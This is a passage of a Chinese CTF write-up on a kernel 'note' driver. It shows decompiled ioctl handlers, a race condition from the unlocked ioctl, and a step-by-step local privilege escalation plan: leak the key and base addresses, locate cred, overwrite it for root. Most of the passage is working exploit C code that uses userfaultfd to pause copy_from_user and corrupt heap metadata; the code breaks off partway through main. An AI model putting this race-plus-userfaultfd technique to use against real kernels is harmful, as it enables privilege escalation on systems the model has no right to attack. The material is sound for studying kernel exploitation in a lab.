+<div class="highlight"><pre><span></span><span class="c1">//(2) delete功能：清空note数组，把bufPtr指向全局缓冲区开头，并清0。</span>
+<span class="n">ptr</span> <span class="o">=</span> <span class="n">notes</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">operation</span> <span class="o">==</span> <span class="o">-</span><span class="mi">253</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">do</span>                  
+<span class="p">{</span>
+  <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="o">++</span><span class="n">ptr</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">while</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">&lt;</span> <span class="n">note_end</span><span class="p">);</span>
+
+<span class="n">bufPtr</span> <span class="o">=</span> <span class="n">bufStart</span><span class="p">;</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">bufStart</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bufStart</span><span class="p">));</span>  
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="c1">// (3) edit功能。注意copy_from_user很耗时，能增大race的成功率</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">operation</span> <span class="o">==</span> <span class="o">-</span><span class="mi">255</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">note</span> <span class="o">=</span> <span class="n">notes</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">note</span> <span class="p">)</span>
+    <span class="p">{</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="n">note</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">;</span>
+    <span class="n">userptr</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">userptr</span><span class="p">;</span>
+    <span class="n">contentPtr</span> <span class="o">=</span> <span class="p">(</span><span class="n">note</span><span class="o">-&gt;</span><span class="n">contentPtr</span> <span class="o">+</span> <span class="n">page_offset_base</span><span class="p">);</span>
+    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">encBuffer</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="n">copy_from_user</span><span class="p">(</span><span class="n">encBuffer</span><span class="p">,</span> <span class="n">userptr</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">length</span> <span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">do</span>
+            <span class="p">{</span>
+              <span class="n">encBuffer</span><span class="p">[</span><span class="n">i</span><span class="o">/</span><span class="mi">8</span><span class="p">]</span> <span class="o">^=</span> <span class="n">note</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">;</span>
+              <span class="n">i</span> <span class="o">+=</span> <span class="mi">8LL</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">while</span> <span class="p">(</span><span class="n">length</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">);</span>                    
+            <span class="n">memcpy</span><span class="p">(</span><span class="n">contentPtr</span><span class="p">,</span> <span class="n">encBuffer</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
+        <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="c1">// (4) show功能。将content用XOR解密后用copy_to_user打印出来。</span>
+<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">operation</span> <span class="o">==</span> <span class="o">-</span><span class="mi">254</span> <span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">tmp_note2</span> <span class="o">=</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="n">global_notes</span><span class="p">[</span><span class="n">note_idx2</span><span class="p">];</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">tmp_note2</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">len</span> <span class="o">=</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">tmp_note2</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>          
+      <span class="n">contentPtr2</span> <span class="o">=</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">tmp_note2</span><span class="o">-&gt;</span><span class="n">contentPtr</span> <span class="o">+</span> <span class="n">page_offset_base</span><span class="p">);</span>
+      <span class="n">memcpy</span><span class="p">(</span><span class="n">encBuffer</span><span class="p">,</span> <span class="n">contentPtr</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span>
+    <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="p">)</span>
+  <span class="p">{</span>
+     <span class="n">ji_2</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+     <span class="k">do</span>
+     <span class="p">{</span>
+       <span class="n">encBuffer</span><span class="p">[</span><span class="n">ji_2</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">^=</span> <span class="n">tmp_note2</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">;</span>
+       <span class="n">ji_2</span> <span class="o">+=</span> <span class="mi">8LL</span><span class="p">;</span>
+     <span class="p">}</span>
+     <span class="k">while</span> <span class="p">(</span> <span class="n">ji_2</span> <span class="o">&lt;</span> <span class="n">len</span> <span class="p">);</span>
+   <span class="p">}</span>
+   <span class="n">userptr</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">userptr</span><span class="p">;</span>
+   <span class="n">_check_object_size</span><span class="p">(</span><span class="n">encBuffer</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
+   <span class="n">copy_to_user</span><span class="p">(</span><span class="n">userptr</span><span class="p">,</span> <span class="n">encBuffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
+   <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<h4 data-content="1" id="9ca8162ad3e4e82bf429eace39312cec">3.漏洞</h4>
+<p>考虑以下两线程：</p>
+<table>
+<thead>
+<tr>
+<th style="">thread 1</th>
+<th style="">thread 2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">edit note 0 (size 0x10)</td>
+<td style="">idle</td>
+</tr>
+<tr>
+<td style="">copy_from_user</td>
+<td style="">idle</td>
+</tr>
+<tr>
+<td style="">idle</td>
+<td style="">delete all notes</td>
+</tr>
+<tr>
+<td style="">idle</td>
+<td style="">add note 0 with size 0x0</td>
+</tr>
+<tr>
+<td style="">idle</td>
+<td style="">add note 1 with size 0x0</td>
+</tr>
+<tr>
+<td style="">continue edit of note 0 (size 0x10)</td>
+<td style="">idle</td>
+</tr>
+</tbody>
+</table>
+<p>由于edit时copy_from_user首次访问mmap地址，触发缺页处理函数，等线程2删除所有note并重新添加两个note后，线程1才继续编辑note 0，此时的编辑content size还是0x10，所以就会产生溢出。</p>
+<h2 data-content="1" id="c047623ada9b22941fee83b294ded2a3">三、漏洞利用</h2>
+<h4 data-content="1" id="9bd9e5647a2e032ba09bd896690fc1c1">1.利用方法</h4>
+<p>目标：若伪造note结构，就能构造任意地址读写。</p>
+<div class="highlight"><pre><span></span><span class="c1">// note结构</span>
+<span class="k">struct</span> <span class="n">note</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">key</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">length</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">contentPtr</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">content</span><span class="p">[];</span>
+<span class="p">}</span>
+</pre></div>
+<p>key值泄露：若读取note 0，则会将加密后的null字节也打印出来，其实就是key值。</p>
+<table>
+<thead>
+<tr>
+<th style="">0x0</th>
+<th style="">note 0, with content size 0x10</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">0x18</td>
+<td style="">note 1</td>
+</tr>
+<tr>
+<td style="">0x30</td>
+<td style="">NULL’ed out data</td>
+</tr>
+</tbody>
+</table>
+<p>module基址泄露：得到key后，可以得到<code>contentPtr</code>值，<code>contentPtr</code>须加上<code>page_base_offset</code>才是真实指针。就能以module的<code>.bss</code>相对地址进行任意读写，可读出<code>notes</code>数组从而泄露module基址。</p>
+<p>内核基址泄露：可读取module的0x6c处的<code>.text:000000000000006C  call _copy_from_user</code>来泄露内核基址。</p>
+<p><code>page_offset_base</code>泄露：读取<code>.text:00000000000001F7  mov  r12, cs:page_offset_base</code>处的4字节偏移<code>page_offset_base_offset</code>，再读取<code>page_offset_base_offset + 0x1fe + mudule_base</code>处的值，就是page_offset_base的值。为什么非要泄露它呢，因为读/写都是以它为基地址。</p>
+<div class="highlight"><pre><span></span><span class="c1">// 泄露内核基址：读取0x6c处的值，取出32位offset，加上pc即可得到copy_from_user函数地址。</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span> <span class="o">=</span> <span class="n">read64</span><span class="p">(</span><span class="mh">0x6c</span> <span class="o">+</span> <span class="n">moduleBase</span><span class="p">);</span>
+<span class="kt">long</span> <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">leak</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="mi">5</span><span class="p">;</span>
+<span class="n">copy_from_user</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">moduleBase</span> <span class="o">+</span> <span class="mh">0x6c</span><span class="p">;</span>
+</pre></div>
+<h4 data-content="1" id="88940477eaebcc79f6d824f8a9fe579e">2.exploit</h4>
+<p>为了准确控制线程1在<code>copy_from_user</code>或<code>copy_to_user</code>处停住，需用到<code>userfaultfd</code>（处理用户空间的页错误）。注意本题的漏洞根本原因在于使用了unlocked_ioctl，对全局数组notes进行访问时没有上锁，所以才能用<code>userfaultfd</code>在<code>copy_from_user</code>处暂停。</p>
+<p><strong>触发溢出步骤</strong>：</p>
+<p>（1）创建1个content length长度为0x10的note。</p>
+<p>（2）创建1个userfalut fd，来监视0x1337000地址处的页错误。</p>
+<p>（3）对note0 进行edit，并利用mmap将传进去的userptr指针指向0x1337000地址空间。</p>
+<p>（4）在edit note0执行到<code>copy_from_user</code>时，进入页错误处理程序。</p>
+<p>（5）也错误处理程序中，清空notes，并创建note0/note1，content length都是0。</p>
+<p>（6）恢复执行edit note0，将note1的content length覆盖为0xf0。</p>
+<p>（7）触发溢出。</p>
+<p><strong>利用步骤</strong>：</p>
+<p>（1）泄露key：输出note1，content内容为NULL，输出内容会与key异或，仍为key。</p>
+<p>（2）泄露module_base：创建note2，输出note1，会输出note2的contentPtr指针，即可计算出module_base。</p>
+<p>（3）泄露page_offset_base：<code>edit note1</code>，将note2的contentPtr改成<code>module_base+0x1fa</code>，<code>.text:00000000000001F7  mov r12, cs:page_offset_base</code>，show note2泄露<code>page_offset_base</code>在module中的偏移<code>page_offset_base_offset</code>；<code>edit note</code>，将note2的contentPtr改成<code>module_base+0x1fe+page_offset_base_offset</code>，泄露出<code>page_offset_base</code>。</p>
+<p>（4）搜索cred地址：利用prctl的<code>PR_SET_NAME</code>功能搜索到task_struct结构，（满足条件：<code>real_cred—NAME前0x10处</code>和<code>cred—NAME前0x8处</code>指针值相等且位于内核空间，大于<code>0xffff000000000000</code>）；将note2的<code>contentPtr</code>覆盖为<code>cred_addr-page_offset_base+4</code>。</p>
+<p>（5）修改cred提权。</p>
+<p><strong>EXP如下</strong>：见<code>exp_cred.c</code>。</p>
+<div class="highlight"><pre><span></span><span class="c1">// gcc -static -pthread xx.c -g -o xx</span>
+<span class="cp">#define _GNU_SOURCE</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;linux/userfaultfd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_noteRequest</span>
+<span class="p">{</span>
+    <span class="kt">size_t</span> <span class="n">idx</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">length</span><span class="p">;</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">userptr</span><span class="p">;</span>
+<span class="p">}</span><span class="n">noteRequest</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+<span class="kt">void</span> <span class="nf">init</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/note"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[+] init done!"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">errExit</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">create</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">length</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">noteRequest</span> <span class="n">req</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">length</span>  <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">userptr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">-</span><span class="mi">256</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">"[-] Failed to create!"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">edit</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">length</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">noteRequest</span> <span class="n">req</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">length</span>  <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">userptr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">idx</span>     <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">-</span><span class="mi">255</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">"[-] Failed to edit!"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">show</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">buf</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">noteRequest</span> <span class="n">req</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">userptr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">idx</span>     <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">-</span><span class="mi">254</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">"[-] Failed to show!"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">delete</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">noteRequest</span> <span class="n">req</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">-</span><span class="mi">253</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">"[-] Failed to delete!"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
+<span class="cp">#define FAULT_PAGE ((void*)(0x1337000))</span>
+
+<span class="kt">void</span><span class="o">*</span> <span class="nf">handler</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">uffd_msg</span> <span class="n">msg</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">uffd</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Handler created"</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">pollfd</span> <span class="n">pollfd</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">nready</span><span class="p">;</span>
+    <span class="n">pollfd</span><span class="p">.</span><span class="n">fd</span>     <span class="o">=</span> <span class="n">uffd</span><span class="p">;</span>
+    <span class="n">pollfd</span><span class="p">.</span><span class="n">events</span> <span class="o">=</span> <span class="n">POLLIN</span><span class="p">;</span>
+    <span class="n">nready</span> <span class="o">=</span> <span class="n">poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pollfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">nready</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1">// 这会一直等待，直到copy_from_user访问FAULT_PAGE</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">"[-] Wrong pool return value"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Trigger! I'm going to hang</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">//现在主线程停在copy_from_user函数了，可以进行利用了</span>
+    <span class="n">delete</span><span class="p">();</span>
+    <span class="n">create</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">create</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="c1">// 原始内存：note0 struct + 0x10 buffer</span>
+    <span class="c1">// 当前内存：note0 struct + note1 struct</span>
+    <span class="c1">// 当主线程继续拷贝时，就会破坏note1区域</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span> <span class="c1">// 偶从uffd读取msg结构，虽然没用</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">"[-] Error in reading uffd_msg"</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">uffdio_copy</span> <span class="n">uc</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+    <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xf0</span><span class="p">;</span> <span class="c1">//把note1 的length改成0xf0</span>
+
+    <span class="n">uc</span><span class="p">.</span><span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
+    <span class="n">uc</span><span class="p">.</span><span class="n">dst</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">FAULT_PAGE</span><span class="p">;</span>
+    <span class="n">uc</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
+    <span class="n">uc</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_COPY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uc</span><span class="p">);</span>  <span class="c1">// 恢复执行copy_from_user</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[+] done 1"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">register_userfault</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">uffdio_api</span> <span class="n">ua</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">uffdio_register</span> <span class="n">ur</span><span class="p">;</span>
+    <span class="n">pthread_t</span> <span class="n">thr</span><span class="p">;</span>
+
+    <span class="kt">uint64_t</span> <span class="n">uffd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_userfaultfd</span><span class="p">,</span> <span class="n">O_CLOEXEC</span> <span class="o">|</span> <span class="n">O_NONBLOCK</span><span class="p">);</span>
+    <span class="n">ua</span><span class="p">.</span><span class="n">api</span> <span class="o">=</span> <span class="n">UFFD_API</span><span class="p">;</span>
+    <span class="n">ua</span><span class="p">.</span><span class="n">features</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_API</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ua</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="c1">// create the user fault fd</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">"[-] ioctl-UFFDIO_API"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">mmap</span><span class="p">(</span><span class="n">FAULT_PAGE</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="n">FAULT_PAGE</span><span class="p">)</span><span class="c1">//create page used for user fault</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">"[-] mmap fault page"</span><span class="p">);</span>
+
+    <span class="n">ur</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">start</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">FAULT_PAGE</span><span class="p">;</span>
+    <span class="n">ur</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">len</span>   <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
+    <span class="n">ur</span><span class="p">.</span><span class="n">mode</span>        <span class="o">=</span> <span class="n">UFFDIO_REGISTER_MODE_MISSING</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_REGISTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ur</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">"[-] ioctl-UFFDIO_REGISTER"</span><span class="p">);</span> <span class="c1">//注册页地址与错误处理fd，这样只要copy_from_user</span>
+                                      <span class="c1">//访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号</span>
+    <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">thr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">handler</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">uffd</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="o">!=</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">"[-] pthread_create"</span><span class="p">);</span> <span class="c1">// handler函数进行访存错误处理</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="n">init</span><span class="p">();</span>
+    <span class="n">create</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>  <span class="c1">// memory layout: note struct + 0x10 buffer</span>
+    <span class="n">register_userfault</span><span class="p">();</span>  <span class="c1">// register the user fault</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">FAULT_PAGE</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+           <span class="cm">/* 漏洞在于edit没有实现锁，所以执行到copy_from_user时访存错误被挂起，</span>
+<span class="cm">           notes被其他线程篡改，copy_from_user继续运行时导致OOB 和 R&amp;W */</span>
+    <span class="c1">// 1.leak key</span>
+    <span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">key</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span> 
+
+    <span class="n">create</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>   <span class="c1">// note2: can be overwritten</span>
+
+    <span class="c1">// 2. leak module base</span>
+    <span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">buffer</span><span class="p">);</span>      
